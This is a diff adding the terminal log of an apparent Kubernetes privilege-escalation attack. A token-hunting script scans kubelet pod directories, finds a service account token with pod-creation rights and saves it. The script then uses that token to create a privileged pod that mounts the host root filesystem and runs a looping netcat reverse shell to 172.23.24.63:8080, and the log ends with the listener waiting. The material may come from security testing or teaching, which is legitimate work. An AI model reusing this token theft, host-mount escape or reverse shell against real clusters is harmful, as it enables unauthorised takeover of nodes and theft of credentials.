@@ -1,0 +1,208 @@
+Extracting token. 
+Service Account Token Hunter
+Running on worker node: worker
+Scanning for privileged service account tokens...
+
+Scanning kubelet pod directories...
+
+Checking pod: 7661ffad-3c5a-4783-b2da-6604967a1a0b
+  ✓ Token found
+  Testing pod creation... ✗ Cannot create pods
+
+Checking pod: 91de8668-82e8-4e67-92f0-5b8e15038d86
+  ✓ Token found
+  Testing pod creation... ✗ Cannot create pods
+
+Checking pod: 95e46a88-e1fe-445b-9a42-c042a29c30ea
+  ✓ Token found
+  Testing pod creation... ✗ Cannot create pods
+
+Checking pod: f0aed829-4fcb-49df-900d-3812afdcfaa7
+  ✓ Token found
+  Testing pod creation... ✓ CAN CREATE PODS!
+
+  SUCCESS: Privileged token found!
+  Service Account: unknown
+  Namespace: cass-operator
+  Saving token to token.txt...
+  ✓ Token saved to token.txt
+
+Creating malicious reverse shell pod, using the found service acount token.
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{
+  "kind": "Pod",
+  "apiVersion": "v1",
+  "metadata": {
+    "name": "reverse-shell-pod",
+    "namespace": "cass-operator",
+    "uid": "623dc9a9-71ca-4a68-8f29-491b2bb18ca3",
+    "resourceVersion": "12909065",
+    "creationTimestamp": "2025-08-01T07:49:57Z",
+    "managedFields": [
+      {
+        "manager": "curl",
+        "operation": "Update",
+        "apiVersion": "v1",
+        "time": "2025-08-01T07:49:57Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:spec": {
+            "f:containers": {
+              "k:{\"name\":\"attacker\"}": {
+                ".": {},
+                "f:command": {},
+                "f:image": {},
+                "f:imagePullPolicy": {},
+                "f:name": {},
+                "f:resources": {},
+                "f:securityContext": {
+                  ".": {},
+                  "f:privileged": {}
+                },
+                "f:terminationMessagePath": {},
+                "f:terminationMessagePolicy": {},
+                "f:volumeMounts": {
+                  ".": {},
+                  "k:{\"mountPath\":\"/host\"}": {
+                    ".": {},
+                    "f:mountPath": {},
+                    "f:name": {}
+                  }
+                }
+              }
+            },
+            "f:dnsPolicy": {},
+            "f:enableServiceLinks": {},
+            "f:nodeName": {},
+            "f:restartPolicy": {},
+            "f:schedulerName": {},
+            "f:securityContext": {},
+            "f:terminationGracePeriodSeconds": {},
+            "f:volumes": {
+              ".": {},
+              "k:{\"name\":\"host-root\"}": {
+                ".": {},
+                "f:hostPath": {
+                  ".": {},
+                  "f:path": {},
+                  "f:type": {}
+                },
+                "f:name": {}
+              }
+            }
+          }
+        }
+      }
+    ]
+  },
+  "spec": {
+    "volumes": [
+      {
+        "name": "host-root",
+        "hostPath": {
+          "path": "/",
+          "type": "Directory"
+        }
+      },
+      {
+        "name": "kube-api-access-wmb4j",
+        "projected": {
+          "sources": [
+            {
+              "serviceAccountToken": {
+                "expirationSeconds": 3607,
+                "path": "token"
+              }
+            },
+            {
+              "configMap": {
+                "name": "kube-root-ca.crt",
+                "items": [
+                  {
+                    "key": "ca.crt",
+                    "path": "ca.crt"
+                  }
+                ]
+              }
+            },
+            {
+              "downwardAPI": {
+                "items": [
+                  {
+                    "path": "namespace",
+                    "fieldRef": {
+                      "apiVersion": "v1",
+                      "fieldPath": "metadata.namespace"
+                    }
+                  }
+                ]
+              }
+            }
+          ],
+          "defaultMode": 420
+        }
+      }
+    ],
+    "containers": [
+      {
+        "name": "attacker",
+        "image": "alpine",
+        "command": [
+          "/bin/sh",
+          "-c",
+          "# Use busybox netcat (already available in Alpine)\n# Loop to keep trying reverse shell connection\nwhile true; do\n  nc 172.23.24.63 8080 -e /bin/sh;\n  sleep 5;\ndone\n"
+        ],
+        "resources": {},
+        "volumeMounts": [
+          {
+            "name": "host-root",
+            "mountPath": "/host"
+          },
+          {
+            "name": "kube-api-access-wmb4j",
+            "readOnly": true,
+            "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
+          }
+        ],
+        "terminationMessagePath": "/dev/termination-log",
+        "terminationMessagePolicy": "File",
+        "imagePullPolicy": "Always",
+        "securityContext": {
+          "privileged": true
+        }
+      }
+    ],
+    "restartPolicy": "Never",
+    "terminationGracePeriodSeconds": 30,
+    "dnsPolicy": "ClusterFirst",
+    "serviceAccountName": "default",
+    "serviceAccount": "default",
+    "nodeName": "worker-1",
+    "secur100  5361    0  4675  100   686   186k  27964 --:--:-- --:--:-- --:--:--  218k
+ityContext": {},
+    "schedulerName": "default-scheduler",
+    "tolerations": [
+      {
+        "key": "node.kubernetes.io/not-ready",
+        "operator": "Exists",
+        "effect": "NoExecute",
+        "tolerationSeconds": 300
+      },
+      {
+        "key": "node.kubernetes.io/unreachable",
+        "operator": "Exists",
+        "effect": "NoExecute",
+        "tolerationSeconds": 300
+      }
+    ],
+    "priority": 0,
+    "enableServiceLinks": true,
+    "preemptionPolicy": "PreemptLowerPriority"
+  },
+  "status": {
+    "phase": "Pending",
+    "qosClass": "BestEffort"
+  }
+}Listening to incoming connections.
+Listening on 0.0.0.0 8080
